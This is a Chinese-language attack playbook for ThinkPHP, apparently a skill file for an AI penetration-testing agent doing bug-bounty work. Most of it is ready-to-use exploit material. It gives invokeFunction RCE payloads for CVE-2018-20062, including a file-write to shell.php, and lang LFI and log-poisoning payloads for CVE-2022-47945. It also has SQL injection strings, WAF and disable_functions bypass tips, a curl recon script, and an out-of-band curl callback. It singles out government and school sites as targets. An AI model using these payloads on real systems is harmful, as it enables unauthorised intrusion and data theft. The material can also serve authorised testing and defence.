---
name: thinkphp
description: ThinkPHP 5.x / 6.x / 3.x 目标栈专项 playbook — 指纹识别 / 全版本 CVE 谱系 / RCE / SQLi / 反序列化利用链。国内 PHP SRC 高频框架。
category: frameworks
tags: [framework, php, thinkphp, china, rce, deserialize]
---

# ThinkPHP Playbook

> **何时用本文件**: 通过 Phase 1 指纹识别已确认目标栈是 ThinkPHP (国内 PHP CMS / SaaS / 企业站常用),需要按版本路由 CVE 谱系。
> **背景**: ThinkPHP 3.x → 5.x → 6.x,**5.0 / 5.1 系是 SRC 实战最高 ROI**,几个 CVE 至今仍能命中老应用。
> **官方源**: <https://www.thinkphp.cn> · 顶峰社区 / GitHub topthink/think

---

## 1. 指纹识别

### 1.1 强指纹

| 信号 | 位置 | 含义 |
| :--- | :--- | :--- |
| `X-Powered-By: ThinkPHP` | 响应头 | 显式标识 |
| 路径含 `index.php?s=` | URL | TP 默认 pathinfo 模式 |
| 报错页含 `think\\` 命名空间 | 报错栈 | TP 5+ namespace |
| 报错页含 `traits\\controller\\Jump` | 报错栈 | TP 5.0 trait |
| 路径 `/public/index.php` | URL | TP 5+ 默认入口 |
| `__construct() must be an instance of think\\Request` | 报错 | TP 5+ |
| favicon 或 logo 是 ThinkPHP 默认 | 静态 | TP 默认主题 |

### 1.2 版本探测命令

```bash
# 触发默认报错页 (含版本号)
curl "https://target/index.php?s=/index/\\think\\app/invokefunction"
curl "https://target/?s=index/think\\Container/invokefunction"

# debug 模式 (开发未关) 直接出版本
curl "https://target/index.php?s=/test/test/test"

# 指纹精确路由
curl "https://target/index.php?s=/think/template/test"
```

### 1.3 版本区分要点

| 版本 | URL 形态 | 默认 controller | 备注 |
| :--- | :--- | :--- | :--- |
| 3.2.x | `index.php?m=Home&c=Index&a=index` | M/C/A 三段 | 老但存量大,SQLi 高发 |
| 5.0.x | `index.php?s=/index/index/index` | s=/module/controller/action | RCE 重灾区 |
| 5.1.x | `index.php?s=/index/index/index` | 同 5.0 但内部结构不同 | RCE 链不同 |
| 6.0.x | URL 路由灵活 | 反序列化为主 | SRC 增多 |

---

## 2. CVE 历史谱系 (按 ROI 排序)

| CVE / 名称 | 影响 | 版本范围 | 优先级 | First-pass |
| :--- | :--- | :--- | :---: | :--- |
| **ThinkPHP 5.x RCE** (CVE-2018-20062) | RCE | 5.0.x ≤ 5.0.23, 5.1.x ≤ 5.1.31 | 🔴 Critical | `?s=index/\think\app/invokefunction&function=phpinfo&vars[0]=1` |
| **ThinkPHP 5.0.x RCE** | RCE | 5.0.10-5.0.23 | 🔴 Critical | 多种 invokeFunction 变体 |
| **ThinkPHP Lang Local Include** (CVE-2022-47945) | LFI → RCE | < 6.0.14, 5.0.x, 5.1.x | 🔴 High | `?lang=../../../etc/passwd%00` |
| **ThinkPHP 5.x 反序列化** | RCE (需 pop chain) | 5.x 全系列 | 🟡 Medium | 找 unserialize 入口 |
| **ThinkPHP 6.x 反序列化** | RCE | 6.0.x | 🟡 Medium | session driver / cache driver |
| **ThinkPHP 3.x SQLi** | SQLi | 3.2.x 全系列 | 🔴 High (老站常见) | I() 函数过滤旁路 |
| **ThinkPHP 5.0 SQLi 顺序参数** | SQLi | 5.0.x | 🟡 Medium | order/where 参数 |
| **ThinkAdmin 未授权下载任意文件** | LFI | ThinkAdmin v6 | 🟡 Medium | `?downpath=../../../config.php` |

---

## 3. 攻击面地图

### 3.1 Tier 1 — RCE (优先)

#### A. invokeFunction 系列 (5.0/5.1)

```bash
# 经典 CVE-2018-20062 多变体
?s=index/\think\app/invokefunction&function=phpinfo&vars[0]=1
?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
?s=index/think\container/invokefunction&function=phpinfo&vars[0]=1
?s=index/think\view\driver\Php/display&content=<?php phpinfo();?>
?s=index/think\template\driver\file/write&cacheFile=shell.php&content=<?php phpinfo();?>
```

测试时:
1. 先用 `phpinfo` / `system('id')` 试探 — 验证 RCE
2. **不要直接写 webshell**,P3.5 HITL 协议
3. 用 OOB 验证盲打: `system('curl http://OOB_DOMAIN')`

#### B. lang LFI → RCE (CVE-2022-47945)

```bash
# 任意文件包含
?lang=../../../../etc/passwd%00
?lang=php://filter/convert.base64-encode/resource=config

# LFI → RCE: 找 nginx log / session file
?lang=../../../../var/log/nginx/access.log%00
```

#### C. 反序列化 (6.x)

```bash
# Session 反序列化入口 (需 session.driver=cache + 可控 session ID)
# 6.0.x 的 pop chain 公开 PoC: think\model\Pivot
```

### 3.2 Tier 2 — SQLi

#### A. ThinkPHP 3.2.x I() 函数旁路

`I('get.id')` 在某些用法下不过滤:
```bash
?id[0]=exp&id[1]=or 1=1#
?id[0]=bind&id[1]=0,update users set ...
```

#### B. ThinkPHP 5.0 order by 注入

```bash
# 经典 order by 参数注入
?order[id`updatexml(1,concat(0x7e,(select%20user())),1)%23]=1
```

#### C. ThinkPHP 5/6 where 数组

`where(['id'=>$_GET['id']])` 看似安全,但 `?id[0]=exp&id[1]=...` 仍可注入。

### 3.3 Tier 3 — 信息泄露

- `runtime/log/` 目录可访问 → 日志泄露 (SQL / 报错栈)
- `application/` `config/` 可访问 → 数据库配置
- `.env` 文件泄露 (TP 6.0 默认有 .env)
- Debug 模式开启 → 完整报错栈含版本 / 文件路径 / SQL
- `runtime/cache/` 可访问 → 缓存 PHP 文件 (含序列化数据)

---

## 4. 系统化 Recon 步骤

```bash
# Step 1: 确认是 ThinkPHP
curl -sI https://target/ | grep -i "x-powered-by"
curl -s "https://target/index.php?s=/test/test/test" | grep -iE "think|tp"

# Step 2: 版本探测 (默认报错页含版本)
curl -s "https://target/index.php?s=/index/\\think\\app/invokefunction"
# 看 ThinkPHP V5.X.XX 字样

# Step 3: 探测常见路径
for p in "application/" "runtime/" "thinkphp/" ".env" "install/" "public/install.php" "data/" "config/"; do
  curl -s -o /dev/null -w "[$p] %{http_code}\n" "https://target/$p"
done

# Step 4: First-pass RCE (低危证明 phpinfo)
curl -s "https://target/index.php?s=index/\\think\\app/invokefunction&function=phpinfo&vars[0]=1" | head -100

# Step 5: lang LFI
curl -s "https://target/?lang=../../../../etc/passwd%00" | head -20

# Step 6: 后台路由
for p in "admin" "manage" "system" "backend" "thinkadmin"; do
  curl -s -o /dev/null -w "[$p] %{http_code}\n" "https://target/$p"
done
```

---

## 5. 利用链优先级

### 5.1 已确认 5.0.x / 5.1.x

1. 跑 invokeFunction 多变体 (12 条 payload 至少 1 条成功)
2. 不写 webshell,先 OOB 验证 + 读敏感文件证据
3. 沿数据库密码 / Redis 密码 / API key 横向

### 5.2 已确认 6.x

1. 优先测 lang LFI (公开 PoC,成功率高)
2. 找 session/cache driver 是否可注入 unserialize 入口
3. 找 admin 后台 + 默认凭证

### 5.3 已确认 3.2.x (老但还多)

1. 优先 I() 函数 SQLi (历史命中率最高)
2. exp / bind 注入语法
3. 找上传接口 + 后缀绕过

### 5.4 已确认 ThinkCMF / ThinkAdmin (基于 ThinkPHP 的二开)

- ThinkCMF: CVE-2019-7580 模板注入 / SSRF
- ThinkAdmin: 任意文件下载 / 任意文件读取 (CVE-2020-25540)
- 看 GitHub README 找对应版本 CVE

---

## 6. False Positives / 验证

| 现象 | 可能误判 | 真实判断 |
| :--- | :--- | :--- |
| invokeFunction 返回 404 | 版本已修?还是路由禁用? | 试多变体 (`\think\app` vs `think\app` vs `think\container`) |
| phpinfo 输出但无 `id` 命令执行 | disable_functions 限制 | 试 `proc_open` `popen` `passthru` 等替代,或 LD_PRELOAD bypass |
| lang LFI 返回原页面 | 已 patch | 不死磕,转 invokeFunction |
| order 注入 `updatexml` 报错但无数据 | mysql 版本不支持?权限不够? | 试 `extractvalue` / `floor()` / `geometrycollection` |
| 全报 500 | WAF? | 试 URL 编码 / 多重编码 / 大小写 |

---

## 7. Impact 证据 (Phase 4 报告)

| 漏洞类型 | Impact | 证据要求 |
| :--- | :--- | :--- |
| invokeFunction RCE | Critical | OOB callback + `whoami` 输出脱敏 |
| lang LFI 读 /etc/passwd | High | 读取截图脱敏 (只保留前 3 行) |
| LFI → RCE via log poisoning | Critical | OOB 验证,不写 shell |
| SQLi 读 user 表 | Critical | DB version + 1 个用户脱敏 |
| Debug 模式信息泄露 | Low-Medium | 截图含 SQL + 文件路径 |
| 后台默认凭证 | High | 登录截图脱敏 + 关键操作权限说明 |

---

## 8. Pro Tips

- **TP 5.x 不死磕一条 payload**: 公开 invokeFunction 链有 ≥12 个变体,Phase 1 一次性全跑,只要 1 条 200 且回显就够
- **WAF 旁路**: 国内 WAF 通常拦截 `\think\app`,但 `\\think\\app` (双反斜杠) / URL 编码后能过
- **Debug 模式定位版本**: 报错页 `ThinkPHP V5.0.24` 字样能精准对齐 CVE
- **二开应用别忽略**: ThinkCMF / ThinkAdmin / OneThink / EasyAdmin 各有自己的 CVE,先 fingerprint
- **admin 后台 OPSEC**: 后台爆破前先看 robots.txt / sitemap.xml,找隐藏后台路径
- **3.2.x 老站常见**: 政府站 / 学校站 / 县区站常停留在 TP 3.2 — 不要忽视,SQLi/越权高发
- **runtime/cache 可读**: 即便不 RCE,缓存文件含 session / 配置 / 业务数据 → 严重信息泄露
- **国内云 WAF**: 阿里云 / 腾讯云 WAF 对 `s=index/\think` 字符串敏感,试 base64+gzip 编码或 chunked encoding 绕

---

## 9. 工具升级线

**classic 版**:
- 指纹: `whatweb` + `wappalyzer` + 手 curl
- 版本探测: `nuclei -t technologies/thinkphp-*`
- RCE 验证: 手写 curl + OOB 域名
- SQLi: `sqlmap` (TP 路由要带 `*` 标记参数点)

**toolPlus 版**:
- 指纹: `mcp__yaklang__http_fuzzer` 一次发 12 条 invokeFunction payload + 4 条 lang LFI
- 静态分析 (若拿到源码): `mcp__yaklang__ssa_compile language="php"` + SyntaxFlow 找 `unserialize` sink
- Chrome MCP: 登录后台后自动截图,挖 admin 接口

---

## 10. 相关参考

- 反序列化通用: [vuln/deserialize.md](../vuln/deserialize.md)
- LFI / 路径遍历: [vuln/path-traversal.md](../vuln/path-traversal.md)
- SQLi: [vuln/sqli.md](../vuln/sqli.md)
- 文件上传: [vuln/upload.md](../vuln/upload.md)
- WAF 绕过: [waf-bypass.md](../waf-bypass.md)
- OOB 基础设施: [oob-infrastructure.md](../oob-infrastructure.md)
- 报告模板: [report-template.md](../report-template.md)
